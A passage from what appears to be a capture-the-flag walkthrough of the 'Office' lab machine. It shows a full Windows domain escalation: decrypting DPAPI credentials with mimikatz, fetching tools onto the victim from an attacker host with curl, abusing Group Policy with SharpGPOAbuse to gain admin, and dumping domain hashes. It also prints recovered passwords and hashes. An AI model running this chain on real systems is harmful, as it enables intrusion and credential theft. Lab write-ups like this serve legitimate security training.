We could use DPAPI to obtain the credentials for `hhogan` but we face an issue, as we need `PPotts`'s password to decrypt the credentials using the master key.

Fortunately, there is a particular [blog post by SpecterOps](https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107) that highlights an important component called MS-BKRP that handles the decryption of DPAPI keys. If our current owner owns the master key, we can get the domain controller to decrypt it for us.
Since we are `PPotts` and own the master credentials associated with the account, we can abuse this component:
```
As Benjamin details, a component of MS-BKRP (the Microsoft BackupKey Remote Protocol) is a RPC server running on domain controllers that handles decryption of DPAPI keys for authorized users via its domain-wide DPAPI backup key. In other words, if our current user context "owns" a given master key, we can nicely ask a domain controller to decrypt it for us! This is not a "vuln", it is by design, and is meant as a failsafe in case users change/lose their passwords, and to support various smart cards' functionality.
```

If we try to enumerate the credentials within a command shell, we get `File Not Found`.

`dir C:\\Users\ppotts\appdata\roaming\Microsoft\credentials\`:
```
The network path was not found.
```

`cd C:\\Users\ppotts\appdata\roaming\Microsoft`

`dir`:
```
Volume in drive C has no label.
 Volume Serial Number is C626-9388

 Directory of C:\Users\PPotts\AppData\Roaming\Microsoft

01/17/2024  03:45 PM    <DIR>          ..
05/02/2023  03:13 PM    <DIR>          AddIns
05/04/2023  09:58 AM    <DIR>          Internet Explorer
05/04/2023  10:07 AM    <DIR>          MMC
01/18/2024  09:34 AM    <DIR>          Network
05/02/2023  03:13 PM    <DIR>          Office
05/02/2023  03:13 PM    <DIR>          Proof
05/04/2023  09:59 AM    <DIR>          Spelling
01/17/2024  04:20 PM    <DIR>          Teams
05/04/2023  10:05 AM    <DIR>          Templates
05/02/2023  03:13 PM    <DIR>          UProof
05/09/2023  09:16 AM    <DIR>          Vault
05/09/2023  10:01 AM    <DIR>          Windows
05/02/2023  03:13 PM    <DIR>          Word
               0 File(s)              0 bytes
              14 Dir(s)   5,086,560,256 bytes free
```

However, if we switch to `PowerShell` and force the directory listing, we can see there are multiple keys stored here.

`powershell.exe`

`ls -force C:\users\ppotts\appdata\roaming\microsoft\credentials\`:
```
    Directory: C:\users\ppotts\appdata\roaming\microsoft\credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          5/9/2023   2:08 PM            358 18A1927A997A794B65E9849883AC3F3E 🔍
-a-hs-          5/9/2023   4:03 PM            398 84F1CAEEBF466550F4967858F9353FB4 🔍
-a-hs-         1/18/2024  11:53 AM            374 E76CCA3670CD9BB98DF79E0A8D176F1E 🔍
```

There are three credential files but we don't yet know which one contains the credentials we are looking for.
Another thing to notice is that there is only 1 master key available, meaning that all three credentials have been encrypted using the same master key. We have to find the location of the master key, which is typically stored in `C:\users\<USER>\appdata\roaming\microsoft\protect\`.

`dir C:\users\ppotts\appdata\roaming\microsoft\protect\`:
```
    Directory: C:\users\ppotts\appdata\roaming\microsoft\protect


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-         1/17/2024   3:43 PM                S-1-5-21-1199398058-4196589450-691661856-1107 🔍
```

`ls -force C:\Users\ppotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107`:
```
    Directory: C:\Users\ppotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-         1/17/2024   3:43 PM            740 10811601-0fa9-43c2-97e5-9bef8471fc7d
-a-hs-          5/2/2023   4:13 PM            740 191d3f9d-7959-4b4d-a520-a444853c47eb 📌
-a-hs-          5/2/2023   4:13 PM            900 BK-OFFICE 📌
-a-hs-        11/18/2024  10:52 AM            740 d44d1ad2-cded-4307-b671-f31200f69696
-a-hs-        11/18/2024  10:52 AM             24 Preferred
```

Since the `CREDHIST` file shows the date of `5/2/2023` we know that the master key used to encrypt the passwords is stored in `191d3f9d-7959-4b4d-a520-a444853c47eb`, which has the same date.
We upload `mimikatz` to the target and begin the decryption phase.

`cd C:\\Users\ppotts\Documents`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`locate -i 'mimikatz.exe'`:
```
/home/kali/tools/mimikatz/Win32/mimikatz.exe
/home/kali/tools/mimikatz/x64/mimikatz.exe
/usr/share/windows-resources/mimikatz/Win32/mimikatz.exe
/usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```

`cp /home/kali/tools/mimikatz/x64/mimikatz.exe ./`

![Victim: ppots](https://custom-icon-badges.demolab.com/badge/Victim-ppots-64b5f6?logo=windows11&logoColor=white)

`curl.exe http://10.10.14.22/mimikatz.exe -o ./mimikatz.exe`

`dir`:
```
    Directory: C:\Users\ppotts\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/9/2023   2:16 PM                WindowsPowerShell
-a----        11/18/2024   3:37 PM        1250056 mimikatz.exe
```

Now we try to obtain the masterkey value so that we can decrypt the credentials stored on the system.

`.\mimikatz.exe`:
```
  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

```
```
mimikatz # dpapi::masterkey /in:C:\Users\ppotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc

**MASTERKEYS**
  dwVersion          : 00000002 - 2
  szGuid             : {191d3f9d-7959-4b4d-a520-a444853c47eb}
  dwFlags            : 00000000 - 0
  dwMasterKeyLen     : 00000088 - 136
  dwBackupKeyLen     : 00000068 - 104
  dwCredHistLen      : 00000000 - 0
  dwDomainKeyLen     : 00000174 - 372
[masterkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : c521daa0857ee4fa6e4246266081e94c
    rounds           : 00004650 - 18000
    algHash          : 00008009 - 32777 (CALG_HMAC)
    algCrypt         : 00006603 - 26115 (CALG_3DES)
    pbKey            : 1107e1ab3e107528a73a2dafc0a2db28de1ea0a07e92cff03a935635013435d75e41797f612903d6eea41a8fc4f7ebe8d2fbecb0c74cdebb1e7df3c692682a066faa3edf107792d116584625cc97f0094384a5be811e9d5ce84e5f032704330609171c973008d84f

[backupkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : a2741b13d7261697be4241ebbe05098a
    rounds           : 00004650 - 18000
    algHash          : 00008009 - 32777 (CALG_HMAC)
    algCrypt         : 00006603 - 26115 (CALG_3DES)
    pbKey            : 21bf24763fbb1400010c08fccc5423fe7da8190c61d3006f2d5efd5ea586f463116805692bae637b2ab548828b3afb9313edc715edd11dc21143f4ce91f4f67afe987005320d3209

[domainkey]
  **DOMAINKEY**
    dwVersion        : 00000002 - 2
    dwSecretLen      : 00000100 - 256
    dwAccesscheckLen : 00000058 - 88
    guidMasterKey    : {e523832a-e126-4d6e-ac04-ed10da72b32f}
    pbSecret         : 159613bdc2d90dd4834a37e29873ce04c74722a706d0ba4770865039b3520ff46cf9c9281542665df2e72db48f67e16e2014e07b88f8b2f7d376a8b9d47041768d650c20661aee31dc340aead98b7600662d2dc320b4f89cf7384c2a47809c024adf0694048c38d6e1e3e10e8bd7baa7a6f1214cd3a029f8372225b2df9754c19e2ae4bc5ff4b85755b4c2dfc89add9f73c54ac45a221e5a72d3efe491aa6da8fb0104a983be20af3280ae68783e8648df413d082fa7d25506e9e6de1aadbf9cf93ec8dfc5fab4bfe1dd1492dbb679b1fa25c3f15fb8500c6021f518c74e42cd4b5d5d6e1057f912db5479ebda56892f346b4e9bf6404906c7cd65a54eea2842
    pbAccesscheck    : 1430b9a3c4ab2e9d5f61dd6c62aab8e1742338623f08461fe991cccd5b3e4621d4c8e322650460181967c409c20efcf02e8936c007f7a506566d66ba57448aa8c3524f0b9cf881afcbb80c9d8c341026f3d45382f63f8665


Auto SID from path seems to be: S-1-5-21-1199398058-4196589450-691661856-1107

[domainkey] with RPC
[DC] 'office.htb' will be the domain
[DC] 'DC.office.htb' will be the DC server
  key : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166 📌
  sha1: 85285eb368befb1670633b05ce58ca4d75c73c77
```

We got the key value of `87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166` from the RPC. With this key, we can now decrypt the stored passwords.

```
mimikatz # dpapi::cred /in:C:\Users\ppotts\appdata\roaming\microsoft\credentials\84F1CAEEBF466550F4967858F9353FB4 /unprotect /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166

**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {191d3f9d-7959-4b4d-a520-a444853c47eb}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 0000003a - 58
  szDescription      : Enterprise Credential Data

  algCrypt           : 00006603 - 26115 (CALG_3DES)
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : 649c4466d5d647dd2c595f4e43fb7e1d
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         : 
  algHash            : 00008004 - 32772 (CALG_SHA1)
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : 32e88dfd1927fdef0ede5abf2c024e3a
  dwDataLen          : 000000c0 - 192
  pbData             : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97
  dwSignLen          : 00000014 - 20
  pbSign             : 21bfb22ca38e0a802e38065458cecef00b450976

Decrypting Credential:
 * using CryptUnprotectData API
 * volatile cache: GUID:{191d3f9d-7959-4b4d-a520-a444853c47eb};KeyHash:85285eb368befb1670633b05ce58ca4d75c73c77
 * masterkey     : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
**CREDENTIAL**
  credFlags      : 00000030 - 48
  credSize       : 000000be - 190
  credUnk0       : 00000000 - 0

  Type           : 00000002 - 2 - domain_password
  Flags          : 00000000 - 0
  LastWritten    : 5/9/2023 11:03:21 PM
  unkFlagsOrSize : 00000018 - 24
  Persist        : 00000003 - 3 - enterprise
  AttributeCount : 00000000 - 0
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : Domain:interactive=OFFICE\HHogan
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : OFFICE\HHogan 🔑
  CredentialBlob : H4ppyFtW183# 🔑
  Attributes     : 0
```

We successfully obtained the decrypted password for `HHogan`.

`netexec smb 10.10.11.3 -u 'hhogan' -p 'H4ppyFtW183#'`:
```
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [+] office.htb\hhogan:H4ppyFtW183#
```

`netexec smb 10.10.11.3 -u 'hhogan' -p 'H4ppyFtW183#' --shares`:
```
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [+] office.htb\hhogan:H4ppyFtW183# 
SMB         10.10.11.3      445    DC               [*] Enumerated shares
SMB         10.10.11.3      445    DC               Share           Permissions     Remark
SMB         10.10.11.3      445    DC               -----           -----------     ------
SMB         10.10.11.3      445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.3      445    DC               C$                              Default share
SMB         10.10.11.3      445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.3      445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.3      445    DC               SOC Analysis                    
SMB         10.10.11.3      445    DC               SYSVOL          READ            Logon server share
```

`netexec smb 10.10.11.3 -u 'hhogan' -p 'H4ppyFtW183#' -x 'whoami'`:
```
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [+] office.htb\hhogan:H4ppyFtW183#
```
❌

`netexec winrm 10.10.11.3 -u 'hhogan' -p 'H4ppyFtW183#'`:
```
WINRM       10.10.11.3      5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb)
WINRM       10.10.11.3      5985   DC               [+] office.htb\hhogan:H4ppyFtW183# (Pwn3d!)
```

`evil-winrm -i 10.10.11.3 -u 'hhogan' -p 'H4ppyFtW183#'`:
```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\HHogan\Documents>
```

![Victim: hhogan](https://custom-icon-badges.demolab.com/badge/Victim-hhogan-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
office\hhogan
```

`whoami /all`:
```
USER INFORMATION
----------------

User Name     SID
============= =============================================
office\hhogan S-1-5-21-1199398058-4196589450-691661856-1108


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                           Attributes
=========================================== ================ ============================================= ==================================================
Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
OFFICE\GPO Managers                         Group            S-1-5-21-1199398058-4196589450-691661856-1117 Mandatory group, Enabled by default, Enabled group 🔍
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

<🔄 Alternative Step>

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

At this stage, we need to enumerate possibilities that leverage being in the `GPO Managers` group.
We upload `PowerView` to the target and begin reconnaissance. We start by taking a look the policies that are applied across the domain.

`locate -i 'powerview.ps1'`:
```
/home/kali/.local/share/pipx/venvs/pwncat-cs/lib/python3.12/site-packages/pwncat/data/PowerSploit/Recon/PowerView.ps1
/home/kali/tools/PowerSploit/Recon/PowerView.ps1
/usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/powerview.ps1
/usr/share/windows-resources/powersploit/Recon/PowerView.ps1
```

`cp /home/kali/tools/PowerSploit/Recon/PowerView.ps1 ./powerview.ps1`

`upload ./powerview.ps1`:
```
Info: Uploading /home/kali/powerview.ps1 to C:\Users\HHogan\Documents\powerview.ps1
                                        
Data: 1027036 bytes of 1027036 bytes copied
                                        
Info: Upload successful!
```

![Victim: hhogan](https://custom-icon-badges.demolab.com/badge/Victim-hhogan-64b5f6?logo=windows11&logoColor=white)

`dir`:
```
    Directory: C:\Users\HHogan\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/15/2024   3:28 PM         770279 powerview.ps1
```

`. .\powerview.ps1`

`Get-DomainGPO | select displayName`:
```
displayname
-----------
Default Domain Policy
Default Domain Controllers Policy
Default Active Directory Settings GPO
Password Policy GPO
Software Installation GPO
Windows Update GPO
Windows Firewall GPO
Windows Update Domain Policy
```

We then enumerate the ACLs for the `GPO Managers` group, filtering for the object's SID.

`$sid = Get-DomainObject -Identity "GPO Managers" -Properties objectsid`

`echo $sid`:
```
objectsid
---------
S-1-5-21-1199398058-4196589450-691661856-1117
```

`$sidValue = $sid.objectsid`

`Get-DomainGPO | Get-ObjectAcl | ? {$_.SecurityIdentifier -eq $sidValue}`:
```
ObjectDN              : CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=office,DC=htb
ObjectSID             :
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, GenericExecute 📌
BinaryLength          : 36
AceQualifier          : AccessAllowed
IsCallback            : False
OpaqueLength          : 0
AccessMask            : 131127
SecurityIdentifier    : S-1-5-21-1199398058-4196589450-691661856-1117
AceType               : AccessAllowed
AceFlags              : ContainerInherit
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None
AuditFlags            : None

ObjectDN              : CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=office,DC=htb
ObjectSID             :
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, GenericExecute 📌
BinaryLength          : 36
AceQualifier          : AccessAllowed
IsCallback            : False
OpaqueLength          : 0
AccessMask            : 131127
SecurityIdentifier    : S-1-5-21-1199398058-4196589450-691661856-1117
AceType               : AccessAllowed
AceFlags              : ContainerInherit
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None
AuditFlags            : None
```

`Get-DomainGPO -Filter "(name={31B2F340-016D-11D2-945F-00C04FB984F9})"`:
```
usncreated               : 5672
systemflags              : -1946157056
displayname              : Default Domain Policy 📌
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1B-2488-11D1-A28C-00
                           C04FB94F17}]
whenchanged              : 5/10/2023 5:30:07 PM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 57836
dscorepropagationdata    : {5/10/2023 5:30:07 PM, 4/14/2023 10:14:59 PM, 1/1/1601 12:00:00 AM}
name                     : {31B2F340-016D-11D2-945F-00C04FB984F9}
flags                    : 0
cn                       : {31B2F340-016D-11D2-945F-00C04FB984F9}
iscriticalsystemobject   : True
gpcfilesyspath           : \\office.htb\sysvol\office.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
distinguishedname        : CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=office,DC=htb
whencreated              : 4/14/2023 10:13:57 PM
versionnumber            : 18
instancetype             : 4
objectguid               : 61e3527f-81bf-456a-b79c-f9a86e8127d0
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=office,DC=htb
```

`Get-DomainGPO -Filter "(name={6AC1786C-016F-11D2-945F-00C04fB984F9})"`:
```
usncreated               : 5675
systemflags              : -1946157056
displayname              : Default Domain Controllers Policy 📌
gpcmachineextensionnames : [{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED
                           4A4D1AFC72}]
whenchanged              : 1/25/2024 10:40:03 PM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 213141
dscorepropagationdata    : {5/10/2023 5:29:54 PM, 4/14/2023 10:14:59 PM, 1/1/1601 12:00:00 AM}
name                     : {6AC1786C-016F-11D2-945F-00C04fB984F9}
flags                    : 0
cn                       : {6AC1786C-016F-11D2-945F-00C04fB984F9}
iscriticalsystemobject   : True
gpcfilesyspath           : \\office.htb\sysvol\office.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
distinguishedname        : CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=office,DC=htb
whencreated              : 4/14/2023 10:13:57 PM
versionnumber            : 12
instancetype             : 4
objectguid               : 021296bc-8f0e-4902-89e8-6e566d72c108
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=office,DC=htb
```

We see that we have complete control over writing new GPOs and executing them.

</🔄 Alternative Step>

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

Now we need to abuse this functionality, and we will use [SharpGPOAbuse](https://github.com/byronkg/SharpGPOAbuse/tree/main) to automate this process and abuse the `Default Domain Policy`.

`locate -i 'sharpgpoabuse.exe'`:
```
/home/kali/tools/SharpCollection/NetFramework_4.0_Any/SharpGPOAbuse.exe
/home/kali/tools/SharpCollection/NetFramework_4.0_x64/SharpGPOAbuse.exe
/home/kali/tools/SharpCollection/NetFramework_4.0_x86/SharpGPOAbuse.exe
/home/kali/tools/SharpCollection/NetFramework_4.5_Any/SharpGPOAbuse.exe
/home/kali/tools/SharpCollection/NetFramework_4.5_x64/SharpGPOAbuse.exe
/home/kali/tools/SharpCollection/NetFramework_4.5_x86/SharpGPOAbuse.exe
/home/kali/tools/SharpCollection/NetFramework_4.7_Any/SharpGPOAbuse.exe
/home/kali/tools/SharpCollection/NetFramework_4.7_x64/SharpGPOAbuse.exe
/home/kali/tools/SharpCollection/NetFramework_4.7_x86/SharpGPOAbuse.exe
```

`cp /home/kali/tools/SharpCollection/NetFramework_4.7_x64/SharpGPOAbuse.exe ./sharpgpoabuse.exe`

`upload ./sharpgpoabuse.exe`:
```
Info: Uploading /home/kali/sharpgpoabuse.exe to C:\Users\HHogan\Documents\sharpgpoabuse.exe
                                        
Data: 386680 bytes of 386680 bytes copied
                                        
Info: Upload successful!
```

![Victim: hhogan](https://custom-icon-badges.demolab.com/badge/Victim-hhogan-64b5f6?logo=windows11&logoColor=white)

`dir`:
```
    Directory: C:\Users\HHogan\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/15/2024   3:28 PM         770279 powerview.ps1
-a----        11/15/2024   3:39 PM         290011 sharpgpoabuse.exe
```

`.\SharpGPOAbuse.exe --AddComputerTask --TaskName "New Task 1" --Author "Office\Administrator" --Command "cmd.exe" --Arguments "/c net localgroup 'Administrators' hhogan /add" --GPOName "Default Domain Controllers Policy"`:
```
[+] Domain = office.htb
[+] Domain Controller = DC.office.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=office,DC=htb
[+] GUID of "DEFAULT DOMAIN CONTROLLERS POLICY" is: {6AC1786C-016F-11D2-945F-00C04fB984F9}
[+] Creating file \\office.htb\SysVol\office.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!
```

<🔄 Alternative Step>

`.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount HHogan --GPOName "Default Domain Policy"`:
```
[+] Domain = office.htb
[+] Domain Controller = DC.office.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=office,DC=htb
[+] SID Value of HHogan = S-1-5-21-1199398058-4196589450-691661856-1108
[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] File exists: \\office.htb\SysVol\office.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] The GPO does not specify any group memberships.
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
```

</🔄 Alternative Step>

We used the tool to add `hhogan` to the local administrators group.
Finally, we force the updated GPO to take effect.

`gpupdate /force`:
```
Updating policy...



Computer Policy update has completed successfully.

User Policy update has completed successfully.
```

`net user hhogan`:
```
User name                    HHogan
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/6/2023 10:59:34 AM
Password expires             Never
Password changeable          5/7/2023 10:59:34 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/10/2023 4:30:58 AM

Logon hours allowed          All

Local Group Memberships      *Administrators 📌    *Remote Management Use
Global Group memberships     *Domain Users         *GPO Managers
The command completed successfully.
```

`dir C:\\Users\Administrator\Desktop`:
```
Access is denied
At line:1 char:1
+ dir C:\\Users\Administrator\Desktop
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator\Desktop:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
Cannot find path 'C:\Users\Administrator\Desktop' because it does not exist.
At line:1 char:1
+ dir C:\\Users\Administrator\Desktop
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\Administrator\Desktop:String) [Get-ChildItem], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
```
❌

`exit`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`evil-winrm -i 10.10.11.3 -u 'hhogan' -p 'H4ppyFtW183#'`:
```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\HHogan\Documents>
```

![Victim: hhogan](https://custom-icon-badges.demolab.com/badge/Victim-hhogan-64b5f6?logo=windows11&logoColor=white)

`cd C:\\Users\Administrator\Desktop`

`dir`:
```
    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/13/2024   4:17 PM             34 root.txt
```

`type C:\\Users\Administrator\Desktop\root.txt`:
``` 
2ff90*************************** 🚩
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

Next, we can extract all the hashes in the domain using `impacket-secretsdump.py`.

`impacket-secretsdump 'office.htb/HHogan:H4ppyFtW183#@10.10.11.3'`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x91bde78672163b8f0021027839600808
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:70f38a92fcf07435790f06b81235478c::: 🔑
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
OFFICE\DC$:aes256-cts-hmac-sha1-96:a03870b4f84e8683da6e59ca63f77b7ebf505da29ad746ca17ee6fe21e912920
OFFICE\DC$:aes128-cts-hmac-sha1-96:fc38c78536a8b06e5f7cb1e1949b95ee
OFFICE\DC$:des-cbc-md5:e93452045d54a16b
OFFICE\DC$:plain_password_hex:3866aad5aa22c70980706bb8deea766ca8a933f1347e1a929db56396ee9233f9bd9190cd7ddfdcf4ae4e7f722df5db11d3f8ed01e0def01a14c4f391fdf23f48c933de474664edaffc1e87b5292e610b9dcdd7ef66f73ea8454c4e35dcd04456f95e2e776e2d6e453056acd10f3fdf4ee6ec92a43d9049235045af1462f22e8429a7f05234aad0c62a1ffd9c8418e4c15e0b51ddcc357c48a33bb5dd97ff911d0c7ef474e209feed79736190f68090cc8e1e984a6adaf93ef9ced8fee2537e854177d9ed427122070db4ddc62889d3ae5beb4f8a1e58e576be5d6875bd11e7cb7c5bf37834d69c09d3328c35247e013d
